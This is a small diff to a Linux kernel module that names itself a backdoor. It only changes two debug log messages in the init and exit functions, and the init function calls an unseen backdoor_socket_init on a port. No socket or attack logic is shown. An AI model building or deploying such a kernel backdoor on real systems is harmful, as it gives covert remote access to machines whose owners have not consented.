@@ -8,13 +8,13 @@
 
 static int __init backdoor_init(void)
 {
-	printk(KERN_DEBUG "Initializing backdoor module\n");
+	printk(KERN_DEBUG "backdoor: initializing backdoor module\n");
 	return backdoor_socket_init(PORT);
 }
 
 static void __exit backdoor_exit(void)
 {
-	printk(KERN_DEBUG "Exiting backdoor module\n");
+	printk(KERN_DEBUG "backdoor: exiting backdoor module\n");
   backdoor_socket_exit();
 }
 
